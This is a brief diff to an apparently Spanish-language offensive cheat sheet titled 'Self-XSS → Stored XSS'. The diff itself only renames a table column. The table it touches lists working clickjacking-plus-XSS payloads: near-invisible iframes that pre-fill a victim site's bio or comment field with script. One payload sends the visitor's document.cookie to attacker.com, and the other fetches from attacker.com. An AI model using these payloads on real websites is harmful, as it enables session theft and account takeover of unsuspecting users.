@@ -25,7 +25,7 @@ linked:
 
 ## Self-XSS → Stored XSS
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `<iframe src="https://victim.com/profile/edit?bio=%3Csvg%2Fonload%3Dfetch(%27%2F%2Fattacker.com%2Fc%3F%27%2Bdocument.cookie)%3E" style="opacity:0.0001;..."></iframe>` + decoy button | Pre-fill bio con XSS + click submit | Self-XSS → Stored. |
 | `<iframe src="https://victim.com/comment/new?body=%3Cimg%20src%3Dx%20onerror%3Dfetch(%27%2F%2Fattacker.com%27)%3E" style="opacity:0.0001"></iframe>` | Pre-fill comment con XSS | Comment stored. |
